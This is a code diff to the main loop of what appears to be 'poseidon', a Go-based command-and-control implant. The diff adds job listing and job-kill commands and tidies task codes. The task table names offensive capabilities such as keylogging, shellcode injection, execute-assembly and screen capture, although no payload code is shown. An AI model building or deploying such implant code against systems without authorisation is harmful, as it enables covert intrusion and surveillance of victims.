@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/xorrior/poseidon/pkg/commands/cat"
+	"github.com/xorrior/poseidon/pkg/commands/executeassembly"
 	"github.com/xorrior/poseidon/pkg/commands/getprivs"
 	"github.com/xorrior/poseidon/pkg/commands/keys"
 	"github.com/xorrior/poseidon/pkg/commands/libinject"
@@ -19,16 +20,24 @@ import (
 	"github.com/xorrior/poseidon/pkg/commands/ps"
 	"github.com/xorrior/poseidon/pkg/commands/screencapture"
 	"github.com/xorrior/poseidon/pkg/commands/shell"
+	"github.com/xorrior/poseidon/pkg/commands/shinject"
 	"github.com/xorrior/poseidon/pkg/commands/sshauth"
 	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
 	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
-	"github.com/xorrior/poseidon/pkg/commands/executeassembly"
-	"github.com/xorrior/poseidon/pkg/commands/shinject"
+)
+import "log"
+
+const (
+	NONE_CODE = 30
+	EXIT_CODE = 0
 )
 
-var assemblyFetched int = 0
+var (
+	assemblyFetched int = 0
+	taskSlice       []structs.Task
+)
 
 //export RunMain
 func RunMain() {
@@ -79,7 +88,7 @@ func main() {
 	profile.SetApfellID(checkIn.ID)
 
 	tasktypes := map[string]int{
-		"exit":             0,
+		"exit":             EXIT_CODE,
 		"shell":            1,
 		"screencapture":    2,
 		"keylog":           3,
@@ -100,7 +109,9 @@ func main() {
 		"portscan":         18,
 		"getprivs":         19,
 		"execute-assembly": 20,
-		"none":             30,
+		"jobs":             21,
+		"jobkill":          22,
+		"none":             NONE_CODE,
 	}
 
 	// Channel used to catch results from tasking threads
@@ -114,9 +125,12 @@ func main() {
 			// Get the next task
 			t := profile.GetTasking()
 			task := t.(structs.Task)
-
+			if tasktypes[task.Command] != EXIT_CODE && tasktypes[task.Command] != NONE_CODE {
+				task.JobKillChan = make(chan int)
+				taskSlice = append(taskSlice, task)
+			}
 			switch tasktypes[task.Command] {
-			case 0:
+			case EXIT_CODE:
 				// Throw away the response, we don't really need it for anything
 				profile.PostResponse(task, "Exiting")
 				break LOOP
@@ -279,7 +293,67 @@ func main() {
 				//log.Println("Done")
 				go executeassembly.Run(args, tMsg, res)
 				break
-			case 30:
+			case 21:
+				// Return the list of jobs.
+				tMsg := structs.ThreadMsg{}
+				tMsg.TaskItem = task
+				log.Println("Number of tasks processing:", len(taskSlice))
+				fmt.Println(taskSlice)
+				var jobList []structs.TaskStub
+				for _, x := range taskSlice {
+					j := structs.TaskStub{
+						Command: x.Command,
+						ID:      x.ID,
+						Params:  x.Params,
+					}
+					jobList = append(jobList, j)
+				}
+				jsonSlices, err := json.Marshal(jobList)
+				tMsg.Error = false
+				log.Println("Finished marshalling tasks into:", string(jsonSlices))
+				if err != nil {
+					log.Println("Failed to marshal :'(")
+					log.Println(err.Error())
+					tMsg.Error = true
+					tMsg.TaskResult = []byte(err.Error())
+					res <- tMsg
+					break
+				}
+				tMsg.TaskResult = jsonSlices
+				go func(threadChan *chan structs.ThreadMsg, msg *structs.ThreadMsg) {
+					*threadChan <- *msg
+				}(&res, &tMsg)
+				log.Println("returned!")
+				break
+			case 22:
+				// Kill the job
+				tMsg := structs.ThreadMsg{}
+				tMsg.Error = false
+				tMsg.TaskItem = task
+
+				foundTask := false
+				for _, taskItem := range taskSlice {
+					if taskItem.ID == task.Params {
+						go func(jobChan chan<- int) {
+							log.Println(fmt.Sprintf("Sending kill message to channel 0x%08d", jobChan))
+							jobChan <- 1
+							log.Println("Sent kill message")
+						}(taskItem.JobKillChan)
+						foundTask = true
+					}
+				}
+
+				if foundTask {
+					tMsg.TaskResult = []byte(fmt.Sprintf("Sent kill signal to Job ID: %s", task.Params))
+				} else {
+					tMsg.TaskResult = []byte(fmt.Sprintf("No job with ID: %s", task.Params))
+					tMsg.Error = true
+				}
+				go func(threadChan *chan structs.ThreadMsg, msg *structs.ThreadMsg) {
+					*threadChan <- *msg
+				}(&res, &tMsg)
+				break
+			case NONE_CODE:
 				// No tasks, do nothing
 				break
 			}
@@ -287,6 +361,16 @@ func main() {
 			// Listen on the results channel for 1 second
 			select {
 			case toApfell := <-res:
+				for i := 0; i < len(taskSlice); i++ {
+					if taskSlice[i].ID == toApfell.TaskItem.ID {
+						if i != (len(taskSlice) - 1) {
+							taskSlice = append(taskSlice[:i], taskSlice[i+1:]...)
+						} else {
+							taskSlice = taskSlice[:i]
+						}
+						break
+					}
+				}
 				if strings.Contains(toApfell.TaskItem.Command, "screencapture") {
 					profile.SendFileChunks(toApfell.TaskItem, toApfell.TaskResult)
 				} else {
